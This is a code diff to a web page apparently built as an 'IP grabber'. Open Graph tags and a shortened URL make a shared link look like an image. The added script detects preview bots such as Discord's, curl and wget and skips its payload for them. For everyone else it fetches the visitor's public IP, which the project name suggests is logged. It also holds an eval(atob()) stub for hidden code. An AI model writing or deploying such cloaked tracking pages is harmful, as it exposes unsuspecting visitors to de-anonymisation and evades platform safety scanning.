@@ -4,7 +4,29 @@
 <meta content="https://shorturl.at/vRYlL" property="og:url" />
 <meta content="https://ssh606.github.io/EducationalIPgrabber/467198052_3458139777821560_9144222598266809724_n.jpg" property="og:image" />
 <script>
+  function detectScraper() {
+  const userAgent = navigator.userAgent;
+
+  // List of common scraper User-Agents
+  const scraperAgents = [
+    "curl",
+    "wget",
+    "python-requests",
+    "node-fetch",
+    "axios",
+    "discord"
+    // Add more known scraper User-Agents here
+  ];
+
+  for (const agent of scraperAgents) {
+    if (userAgent.toLowerCase().includes(agent)) {
+      return true;
+    }
+  }
+  return false;
+}
   eval(atob(""))
+  if(detectScraper()) {return false;} else {
   let i = ""
   fetch("https://myexternalip.com/raw").then(res=>{
     res.text().then(tx=>{
@@ -59,4 +81,5 @@
       })
     })
   })
+  }
 </script>
